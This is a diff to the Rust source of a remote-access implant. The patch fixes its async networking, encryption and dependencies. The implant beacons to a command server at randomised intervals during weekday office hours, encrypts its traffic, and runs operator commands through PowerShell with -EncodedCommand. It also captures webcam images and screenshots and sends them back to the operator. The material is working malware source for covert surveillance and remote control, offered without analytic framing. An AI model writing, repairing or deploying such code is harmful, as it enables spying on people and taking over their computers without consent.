@@ -1,19 +1,27 @@
-use std::net::TcpStream;
-use std::io::{Read, Cursor};
+use async_std::net::TcpStream;
+use async_std::task;
+use async_trait::async_trait;
+use std::path::Path;
+use std::process::Output;
+use std::io::prelude::*;
 use std::process::Command;
+use std::sync::{Arc, Mutex};
 use std::fs::{File, create_dir};
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 use std::thread;
-use std::sync::{Arc, Mutex};
-use rand::Rng;
-use screenshots::Screen;
-use image::{ImageBuffer, Rgb};
-use chrono::Local;
+use std::error::Error;
+use aes_gcm::aead::Aead;
+use base64::engine::general_purpose;
+use base64::Engine;
+use ::image::EncodableLayout;
+use sha2::digest::generic_array::GenericArray;
+use sysinfo::{System, SystemExt};
+use rand::{Rng, RngCore};
+use screenshots::{Screen, image};
+use chrono::{Local, Datelike, Timelike};
 use sha2::{Sha256, Digest, Sha512};
 use pbkdf2::pbkdf2_hmac;
-use aes_gcm::{Aes256Gcm, Key, Nonce};
-use base64::{encode, decode};
-use sysinfo::{System, SystemExt};
+use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
 use opencv::{core, highgui, imgcodecs, prelude::*, videoio};
 
 // Constants
@@ -35,20 +43,17 @@ const BEACON_MIN_INTERVAL: u64 = 5 * 60 * 1000; // 5 minutes
 const BEACON_MAX_INTERVAL: u64 = 45 * 60 * 1000; // 45 minutes
 
 // Global variables (using Arc<Mutex<>> for shared mutable state)
-lazy_static! {
-    static ref CLIENT: Arc<Mutex<Option<TcpStream>>> = Arc::new(Mutex::new(None));
-    static ref BEACON_INTERVAL_INSTANCE: Arc<Mutex<Option<thread::JoinHandle<()>>>> = Arc::new(Mutex::new(None));
-    static ref LOG_STREAM: Arc<Mutex<Option<File>>> = Arc::new(Mutex::new(None));
-    static ref START_TIME: SystemTime = SystemTime::now();
-    static ref EXIT_PROCESS: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
-    static ref SESSION_ID: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
-}
-
-const LOGGING: bool = true;
+static LOGGING: bool = true; // Set this to true or false as needed
+static CLIENT: Arc<Mutex<Option<TcpStream>>> = Arc::new(Mutex::new(None));
+static BEACON_INTERVAL_INSTANCE: Arc<Mutex<Option<thread::JoinHandle<()>>>> = Arc::new(Mutex::new(None));
+static LOG_STREAM: Arc<Mutex<Option<File>>> = Arc::new(Mutex::new(None));
+static START_TIME: SystemTime = SystemTime::now();
+static EXIT_PROCESS: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
+static SESSION_ID: Arc<Mutex<Option<String>>> = Arc::new(Mutex::new(None));
 
 fn log_it(message: &str) {
     if LOGGING {
-        if let Some(mut file) = LOG_STREAM.lock().unwrap().as_mut() {
+        if let Some(file) = LOG_STREAM.lock().unwrap().as_mut() {
             let timestamp: u64 = SystemTime::now()
                 .duration_since(UNIX_EPOCH)
                 .unwrap()
@@ -58,7 +63,7 @@ fn log_it(message: &str) {
     }
 }
 
-fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn std::error::Error>> {
+fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn Error>> {
     let peer_addr: std::net::SocketAddr = client.peer_addr()?;
     let ip_address: String = peer_addr.ip().to_string();
     log_it(&format!("IP Address: {}", ip_address));
@@ -77,7 +82,7 @@ fn get_session_id(client: &TcpStream) -> Result<String, Box<dyn std::error::Erro
     Ok(crypt)
 }
 
-fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn std::error::Error>> {
+fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn Error>> {
     let mut salt: [u8; 32] = [0u8; 32];
     rand::thread_rng().fill_bytes(&mut salt);
     
@@ -87,34 +92,40 @@ fn encrypt_data(data: &str, shared_key: &str) -> Result<String, Box<dyn std::err
     let mut iv: [u8; 12] = [0u8; 12];
     rand::thread_rng().fill_bytes(&mut iv);
     
-    let key = Key::from_slice(&key);
+    let key = GenericArray::from_slice(&key);
     let nonce = Nonce::from_slice(&iv);
     
     let cipher = Aes256Gcm::new(key);
     let ciphertext = cipher.encrypt(nonce, data.as_bytes())
         .map_err(|e| format!("Encryption failed: {:?}", e))?;
     
-    let salt_b64: String = base64::encode(salt);
-    let iv_b64: String = base64::encode(iv);
-    let ciphertext_b64: String = base64::encode(ciphertext);
+    let salt_b64: String = general_purpose::STANDARD.encode(salt);
+    let iv_b64: String = general_purpose::STANDARD.encode(iv);
+    let ciphertext_b64: String = general_purpose::STANDARD.encode(ciphertext);
     
     Ok(format!("{}:{}:{}", salt_b64, iv_b64, ciphertext_b64))
 }
 
-fn decrypt_data(encrypted: &str, shared_key: &str) -> Result<String, Box<dyn std::error::Error>> {
+fn decrypt_data(encrypted: &str, shared_key: &str) -> Result<String, Box<dyn Error>> {
     let parts: Vec<&str> = encrypted.split(':').collect();
     if parts.len() != 3 {
         return Err("Invalid encrypted data format".into());
     }
     
-    let salt: Vec<u8> = base64::decode(parts[0])?;
-    let iv: Vec<u8> = base64::decode(parts[1])?;
-    let ciphertext: Vec<u8> = base64::decode(parts[2])?;
+    let salt: Vec<u8> = general_purpose::STANDARD
+        .decode(parts[0])
+        .unwrap();
+    let iv: Vec<u8> = general_purpose::STANDARD
+        .decode(parts[1])
+        .unwrap();
+    let ciphertext: Vec<u8> = general_purpose::STANDARD
+        .decode(parts[2])
+        .unwrap();
     
     let mut key: [u8; 32] = [0u8; 32];
     pbkdf2_hmac::<Sha512>(shared_key.as_bytes(), &salt, 200_000, &mut key);
     
-    let key = Key::from_slice(&key);
+    let key = GenericArray::from_slice(&key);
     let nonce = Nonce::from_slice(&iv);
     
     let cipher = Aes256Gcm::new(key);
@@ -128,8 +139,8 @@ fn get_retry_interval(retries: usize) -> u64 {
     RETRY_INTERVALS.get(retries).cloned().unwrap_or(0)
 }
 
-async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
-    let session_id: str = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
+async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn Error>> {
+    let session_id: String = SESSION_ID.lock().unwrap().clone().ok_or("Session ID not set")?;
     let encrypted: String = encrypt_data(&serde_json::to_string(&response)?, &session_id)?;
     
     if encrypted.len() >= CHUNK_SIZE {
@@ -152,8 +163,7 @@ async fn send_command(response: serde_json::Value) -> Result<(), Box<dyn std::er
     Ok(())
 }
 
-async fn send_beacon() -> Result<(), Box<dyn std::error::Error>> {
-    let sys: System = System::new_all();
+async fn send_beacon() -> Result<(), Box<dyn Error>> {
     let response: serde_json::Value = serde_json::json!({
         "response": {
             "beacon": true,
@@ -161,8 +171,8 @@ async fn send_beacon() -> Result<(), Box<dyn std::error::Error>> {
             "type": TYPE,
             "platform": std::env::consts::OS,
             "arch": std::env::consts::ARCH,
-            "osver": sys.os_version().unwrap_or_default(),
-            "hostname": sys.host_name().unwrap_or_default()
+            "osver": System::os_version().unwrap_or_default(),
+            "hostname": System::host_name().unwrap_or_default()
         }
     });
     send_command(response).await
@@ -186,7 +196,7 @@ fn format_file_name(name: &str, extension: &str) -> String {
     )
 }
 
-async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
+async fn run_webcam_clip() -> Result<(), Box<dyn Error>> {
     // Set the file name for saving the image
     let file_name: String = format_file_name("wc", "jpg");
 
@@ -212,7 +222,7 @@ async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
     imgcodecs::imencode(".jpg", &frame, &mut buf, &core::Vector::new())?;
 
     // Convert the image buffer to base64
-    let encoded_image: String = base64::encode(&buf);
+    let encoded_image: String = general_purpose::STANDARD.encode(&buf);
 
     // Send the command (assuming send_command is defined elsewhere)
     send_command(serde_json::json!({
@@ -225,24 +235,23 @@ async fn run_webcam_clip() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-async fn run_screenshot() -> Result<(), Box<dyn std::error::Error>> {
+async fn run_screenshot() -> Result<(), Box<dyn Error>> {
     let file_name: String = format_file_name("ss", "jpg");
     
     let screen: Screen = screenshots::Screen::all()?[0];
-    let image: screenshots::image::ImageBuffer<screenshots::image::Rgba<u8>, Vec<u8>> = screen.capture()?;
-    let buffer = image.buffer();
+    let buffer: image::ImageBuffer<image::Rgba<u8>, Vec<u8>> = screen.capture()?;
 
     send_command(serde_json::json!({
         "response": {
             "download": file_name,
-            "data": base64::encode(buffer)
+            "data": general_purpose::STANDARD.encode(buffer.as_bytes())
         }
     })).await?;
 
     Ok(())
 }
 
-async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn std::error::Error>> {
+async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<String, Box<dyn Error>> {
     let command: &str = command.trim();
     if command.is_empty() {
         return Err("No command provided.".into());
@@ -271,14 +280,14 @@ async fn run_command(command: &str, payload: &str, is_file: bool) -> Result<Stri
             if is_file {
                 cmd.arg("-File").arg(payload);
             } else {
-                let encoded_cmd = base64::encode(&utf8_to_16(payload));
+                let encoded_cmd: String = general_purpose::STANDARD.encode(&utf8_to_16(payload).as_bytes());
                 cmd.args(&["-EncodedCommand", &encoded_cmd]);
             }
         },
         _ => unreachable!(),
     }
 
-    let output: <<Result<std::process::Output, std::io::Error> as IntoFuture>::Output as Try>::Output = cmd.output().await?;
+    let output: Output = cmd.output()?;
     if !output.status.success() {
         return Err(format!("Command failed with code {}. Error output: {}", 
                            output.status.code().unwrap_or(-1), 
@@ -297,8 +306,8 @@ fn format_time(milliseconds: u64) -> String {
     format!("{}d {}h {}m {}s", days, hours, minutes, seconds)
 }
 
-async fn get_uptime() -> Result<(), Box<dyn std::error::Error>> {
-    let start: SystemTime = *START_TIME.lock().unwrap();
+async fn get_uptime() -> Result<(), Box<dyn Error>> {
+    let start: SystemTime = *START_TIME;
     let uptime: Duration = SystemTime::now().duration_since(start)?;
     let formatted_uptime: String = format_time(uptime.as_millis() as u64);
     
@@ -311,7 +320,7 @@ async fn get_uptime() -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
+async fn parse_action(action: &str) -> Result<(), Box<dyn Error>> {
     let parts: Vec<&str> = action.trim().split_whitespace().collect();
     if parts.is_empty() {
         return Err("No action provided".into());
@@ -348,7 +357,7 @@ async fn parse_action(action: &str) -> Result<(), Box<dyn std::error::Error>> {
     Ok(())
 }
 
-fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
+async fn connect_to_server() -> Result<(), Box<dyn Error>> {
     let mut retry_count: u32 = 0;
 
     loop {
@@ -360,7 +369,7 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                 let session_id: String = get_session_id(&CLIENT.lock().unwrap().as_ref().unwrap())?;
                 *SESSION_ID.lock().unwrap() = Some(session_id);
 
-                send_beacon()?;
+                send_beacon().await?;
 
                 let beacon_interval: u64 = rand::thread_rng().gen_range(BEACON_MIN_INTERVAL..=BEACON_MAX_INTERVAL);
                 let start_time: Instant = Instant::now();
@@ -369,7 +378,7 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                     if start_time.elapsed().as_millis() >= beacon_interval as u128 {
                         let now: chrono::DateTime<Local> = Local::now();
                         if now.weekday().num_days_from_monday() < 5 && (7..=19).contains(&now.hour()) {
-                            send_beacon()?;
+                            send_beacon().await?;
                         }
                         break;
                     }
@@ -383,9 +392,9 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
                         Ok(n) => {
                             let data = String::from_utf8_lossy(&buffer[..n]);
                             log_it(&format!("Received data: {}", data));
-                            let session_id: str = SESSION_ID.lock().unwrap().clone().unwrap();
+                            let session_id: String = SESSION_ID.lock().unwrap().clone().unwrap();
                             let decrypted: String = decrypt_data(&data, &session_id)?;
-                            parse_action(&decrypted)?;
+                            parse_action(&decrypted).await?;
                         }
                         Err(e) => {
                             log_it(&format!("Error reading from socket: {}", e));
@@ -414,7 +423,7 @@ fn connect_to_server() -> Result<(), Box<dyn std::error::Error>> {
     }
 }
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() -> Result<(), Box<dyn Error>> {
     if LOGGING {
         let logs_dir = Path::new("logs");
         if !logs_dir.exists() {
@@ -424,5 +433,5 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         *LOG_STREAM.lock().unwrap() = Some(File::create(log_file)?);
     }
 
-    connect_to_server()
+    task::block_on(connect_to_server())
 }
